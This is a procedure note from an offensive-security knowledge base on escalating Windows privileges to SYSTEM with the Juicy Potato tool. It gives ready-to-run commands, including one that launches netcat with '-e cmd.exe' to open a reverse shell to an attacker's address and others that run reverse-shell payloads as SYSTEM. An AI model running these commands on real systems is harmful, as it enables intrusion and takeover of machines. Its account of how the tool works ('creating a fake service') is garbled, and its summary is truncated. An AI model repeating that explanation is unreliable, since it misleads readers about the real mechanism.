---
id: e1dd411b-327b-46c1-bea6-4f9203105b38
name: Abusing Golden Privileges with Juicy Potato
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.170654+00:00'
updated_at: '2023-04-10T20:37:51.928355+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
sub_techniques:
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
tags:
- '[[EoP - Impersonation Privileges]]'
- '[[Juicy Potato (Abusing the golden privileges)]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Check User Privileges]]'
- '[[JuicyPotato.exe -l 1337]]'
- '[[JuicyPotato.exe -l 1340]]'
- '[[JuicyPotato.exe -l 9999]]'
---

# Abusing Golden Privileges with Juicy Potato

## Summary

Abusing Golden Privileges with Juicy Potato is a technique used to escalate privileges on a Windows system. This technique takes advantage of the way Windows handles certain service accounts, such as the Local Service account, to gain SYSTEM-level privileges. Juicy Potato is a tool that automates t

## Description

# Description

Abusing Golden Privileges with Juicy Potato is a technique used to escalate privileges on a Windows system. This technique takes advantage of the way Windows handles certain service accounts, such as the Local Service account, to gain SYSTEM-level privileges. Juicy Potato is a tool that automates this process. By exploiting the way Windows checks for the highest privileged service account, Juicy Potato can be used to gain SYSTEM-level privileges on a vulnerable system. This technique can be used to gain access to sensitive data, install malware, or perform other malicious activities.

From a technical perspective, Juicy Potato works by creating a fake service and then impersonating a high-privileged user. When Windows checks for the highest privileged account, it finds the fake service and grants SYSTEM-level privileges to the user. This technique can be used on a wide range of Windows systems, including Windows 7, 8, 8.1, and 10.

From a business perspective, this technique can be used by attackers to gain access to sensitive data and perform other malicious activities. By gaining SYSTEM-level privileges, attackers can install malware, exfiltrate data, or perform other actions that could be detrimental to the business. It is important for organizations to be aware of this technique and take steps to protect against it.

 

## Requirements

1. Access to a vulnerable Windows system

1. Juicy Potato tool

 

## Defense

1. Regularly patch and update Windows systems to prevent vulnerabilities

1. Use a host-based intrusion detection system to detect and prevent privilege escalation techniques

1. Restrict access to sensitive systems and data to only authorized users

 

## Objectives

1. Gain SYSTEM-level privileges on a Windows system

1. Install malware or perform other malicious activities

 

# Instructions

1. To check the privileges of the service account, run the command 'whoami /priv' in a PowerShell prompt.

 



**Code**: [[whoami /priv]]



> This command will display a list of privileges that are currently assigned to the service account. The two privileges to look for are **SeImpersonate** and **SeAssignPrimaryToken**. These privileges are required for a service account to be able to authenticate and impersonate a client, which is necessary for some applications to function properly.



**Command** ([[Check User Privileges]]):

```bash
whoami /priv
```



2. JuicyPotato is a tool used to perform privilege escalation on Windows systems. The -l flag is used to specify the local port to listen on. The -p flag is used to specify the path to the executable to be run with SYSTEM privileges. The -a flag is used to specify the arguments to be passed to the executable. The -t flag is used to specify the type of token to use. The -c flag is used to specify the CLSID of the DCOM object to use for the COM activation. To run JuicyPotato, open a command prompt and navigate to the directory where JuicyPotato is located. Then execute the command with the appropriate flags and arguments.

 



**Code**: [[JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upl]]



> -l: Specifies the local port to listen on.
-p: Specifies the path to the executable to be run with SYSTEM privileges.
-a: Specifies the arguments to be passed to the executable.
-t: Specifies the type of token to use.
-c: Specifies the CLSID of the DCOM object to use for the COM activation.



**Command** ([[JuicyPotato.exe -l 9999]]):

```bash
JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```





**Command** ([[JuicyPotato.exe -l 1340]]):

```bash
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```





**Command** ([[JuicyPotato.exe -l 1337]]):

```bash
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]

### Sub-Techniques

- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]

## Commands Used

- [[Check User Privileges]]
- [[JuicyPotato.exe -l 1337]]
- [[JuicyPotato.exe -l 1340]]
- [[JuicyPotato.exe -l 9999]]

## Tags

- [[EoP - Impersonation Privileges]]
- [[Juicy Potato (Abusing the golden privileges)]]
- [[Windows - Privilege Escalation]]


